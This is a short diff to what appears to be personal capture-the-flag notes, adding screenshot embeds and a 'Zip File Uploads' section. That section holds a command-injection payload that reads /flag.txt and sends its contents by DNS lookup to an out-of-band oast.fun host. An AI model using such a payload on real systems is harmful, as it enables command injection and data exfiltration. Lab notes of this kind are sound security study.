@@ -49,4 +49,10 @@ https://ey8u7q46.eu1.ctfio.com/stock-check.php?id=f3d1426d-16af-4243-a148-d7c874
 
 ![[Pasted image 20241215202307.png]]
 
+![[Pasted image 20241215204332.png]]
 
+# Zip File Uploads
+
+```
+$(nslookup `cat /flag.txt`.puuatcmlkisigmqtcmzz2h8t9h4o08jgb.oast.fun)
+```
